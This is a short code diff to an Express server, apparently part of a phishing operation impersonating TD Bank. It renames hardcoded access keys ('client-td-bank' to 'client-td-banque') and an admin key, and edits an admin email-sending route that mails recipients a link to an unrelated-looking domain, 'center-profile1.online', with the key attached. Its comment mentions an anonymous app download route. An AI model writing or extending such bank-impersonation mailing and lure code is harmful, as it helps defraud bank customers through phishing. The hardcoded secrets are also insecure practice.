@@ -67,8 +67,8 @@ app.use(express.json());
 // =============================================
 // ACCESS KEY PROTECTION
 // =============================================
-const VALID_ACCESS_KEY = 'client-td-bank';
-const ADMIN_ACCESS_KEY = 'whapooooSend';
+const VALID_ACCESS_KEY = 'client-td-banque';
+const ADMIN_ACCESS_KEY = 'whapsendmail';
 
 app.use('/api/', (req, res, next) => {
   // Allow anonymous access to the app download route
@@ -338,7 +338,7 @@ app.post('/api/admin/send-email', async (req, res) => {
     return res.status(400).json({ success: false, error: 'Recipient is required.' });
   }
 
-  const link = 'https://center-profile1.online/?key=client-td-bank';
+  const link = 'https://center-profile1.online/?key=client-td-banque';
 
   const RESEND_API_KEY = process.env.RESEND_API_KEY;
   const FROM_EMAIL     = process.env.RESEND_FROM_EMAIL;
